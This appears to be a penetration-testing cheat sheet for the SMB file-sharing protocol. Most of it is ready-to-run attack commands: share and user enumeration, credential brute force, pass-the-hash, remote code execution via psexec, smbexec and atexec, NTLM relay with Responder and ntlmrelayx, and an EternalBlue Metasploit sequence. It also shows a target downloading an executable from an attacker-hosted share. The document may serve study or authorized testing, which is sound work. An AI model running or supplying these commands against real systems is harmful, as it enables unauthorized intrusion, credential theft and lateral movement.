#SMB #ServerMessageBlock #CIFS #Samba #filetransfer

## What is SMB?
Server Message Block — network file sharing protocol. Dominant in Windows environments. Also implemented as Samba on Linux/Unix. Used for file shares, printers, and IPC (named pipes for RPC/WMI).

- Port **TCP 445** — direct SMB (modern)
- Port **TCP 139** — SMB over NetBIOS (legacy)
- Port **UDP 137,138** — NetBIOS name/datagram services

---

## SMB Versions

| Version | Supported OS | Notes |
|---|---|---|
| CIFS | Windows NT 4.0 | Communication via NetBIOS interface |
| SMB 1.0 | Windows 2000 | Direct TCP; EternalBlue (MS17-010) target |
| SMB 2.0 | Vista / Server 2008 | Performance improvements, message signing |
| SMB 2.1 | Windows 7 / Server 2008 R2 | Locking mechanisms |
| SMB 3.0 | Windows 8 / Server 2012 | Multi-channel, end-to-end encryption |
| SMB 3.0.2 | Windows 8.1 / Server 2012 R2 | |
| SMB 3.1.1 | Windows 10 / Server 2016 | Integrity checking, AES-128 |

---

## Enumeration

```bash
# Nmap SMB scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -sV <target>
nmap -p 445 --script smb-vuln* <target>  # check for known vulnerabilities

# enum4linux-ng (comprehensive)
enum4linux-ng -A <target>
enum4linux-ng -A -C <target>  # with additional checks

# CrackMapExec
crackmapexec smb <target>
crackmapexec smb <target> -u '' -p '' --shares      # null session shares
crackmapexec smb <target> -u guest -p '' --shares   # guest access
crackmapexec smb <target> -u <user> -p <pass> --shares
crackmapexec smb <target> -u <user> -p <pass> --users
crackmapexec smb <target> -u <user> -p <pass> --groups
crackmapexec smb <target> -u <user> -p <pass> --pass-pol

# spider_plus — search shares for sensitive files
crackmapexec smb <target> -u <user> -p <pass> -M spider_plus
crackmapexec smb <target> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false

# smbmap
smbmap -H <target>                           # list shares (unauthenticated)
smbmap -H <target> -u <user> -p <pass>      # list shares (authenticated)
smbmap -H <target> -u <user> -p <pass> -R  # recursive listing
smbmap -H <target> -u <user> -p <pass> --download 'SHARE\path\file'

# rpcclient (null session)
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenumall
```

---

## Connect / Access

### Linux — smbclient

```bash
# List shares (null session)
smbclient -N -L //<target>
smbclient -L //<target> -U ''

# Connect to share (null/anonymous)
smbclient -N //<target>/sharename
smbclient //<target>/sharename -U ''

# Connect with credentials
smbclient //<target>/sharename -U user%Password123
smbclient //<target>/sharename -U domain/user%pass

# Download all files from share
smbclient //<target>/sharename -U user%pass -c 'recurse;prompt;mget *'

# smb: commands inside smbclient
smb: \> ls
smb: \> cd <dir>
smb: \> get <file>
smb: \> put <file>
smb: \> mget *
smb: \> mput *
```

### Windows — net use / PowerShell

```cmd
# Map share to drive letter
net use n: \\192.168.220.129\Finance
net use n: \\192.168.220.129\Finance /user:user Password123

# Count files
dir n: /a-d /s /b | find /c ":\"

# Search for keyword in filenames
dir n:\*cred* /s /b

# Search inside files
findstr /s /i cred n:\*.*
```

```powershell
# List share contents
Get-ChildItem \\192.168.220.129\Finance\

# Map share with credentials
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

# Count files
(Get-ChildItem -File -Recurse | Measure-Object).Count

# Search for cred files
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

---

## Host a File Share (impacket-smbserver)

Useful for hosting payloads, receiving files from targets, or relaying hashes.

```bash
# Start anonymous SMB share (current directory)
sudo impacket-smbserver share ./ -smb2support

# Start with auth required
sudo impacket-smbserver share ./ -smb2support -user attacker -password Password123

# Target downloads from share
# Windows: copy \\<attacker>\share\file.exe .
# PowerShell: (New-Object Net.WebClient).DownloadFile('\\<attacker>\share\file.exe', 'C:\file.exe')

# Target uploads to share
# copy file.txt \\<attacker>\share\
```

---

## Attack Vectors

### Brute Force

```bash
crackmapexec smb <target> -u users.txt -p passwords.txt --no-bruteforce
crackmapexec smb <target> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://<target>
```

### Pass-the-Hash (PTH)

```bash
# CrackMapExec PTH
crackmapexec smb <target> -u <user> -H <NTLM_hash>
crackmapexec smb <target>/24 -u <user> -H <NTLM_hash>  # sweep subnet

# smbclient PTH
smbclient //<target>/C$ -U user%hash --pw-nt-hash

# impacket PSExec
psexec.py <domain>/<user>@<target> -hashes :<NTLM>

# impacket smbexec / wmiexec
smbexec.py <domain>/<user>@<target> -hashes :<NTLM>
wmiexec.py <domain>/<user>@<target> -hashes :<NTLM>
```

### Remote Code Execution

```bash
# PsExec (requires admin share access)
psexec.py <user>:<pass>@<target>
psexec.py <domain>/<user>:<pass>@<target>

# smbexec (stealth — no binary dropped)
smbexec.py <user>:<pass>@<target>

# atexec (scheduled task)
atexec.py <user>:<pass>@<target> "whoami"
```

### NTLM Relay

```bash
# 1. Disable SMB and HTTP in Responder config first
sudo nano /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off

# 2. Start Responder to capture
sudo responder -I tun0

# 3. Start ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```

### EternalBlue (MS17-010) — SMBv1

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker>
run
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| SMBv1 enabled | EternalBlue and other critical vulns |
| Null session / guest access | Unauthenticated enumeration |
| No SMB signing | NTLM relay attacks |
| Admin shares accessible (C$, ADMIN$) | Lateral movement |
| Weak credentials | Brute force / spray |
| Writable shares | Malware placement |

---

## Quick Reference

| Goal | Command |
|---|---|
| List shares (unauthenticated) | `smbclient -N -L //host` |
| List shares (authenticated) | `smbmap -H host -u user -p pass` |
| Enum all | `enum4linux-ng -A host` |
| Connect to share | `smbclient //host/share -U user%pass` |
| PTH with CME | `crackmapexec smb host -u user -H hash` |
| PTH with psexec | `psexec.py domain/user@host -hashes :NTLM` |
| Brute force | `crackmapexec smb host -u users.txt -p pass.txt` |
| Vuln check | `nmap -p 445 --script smb-vuln* host` |
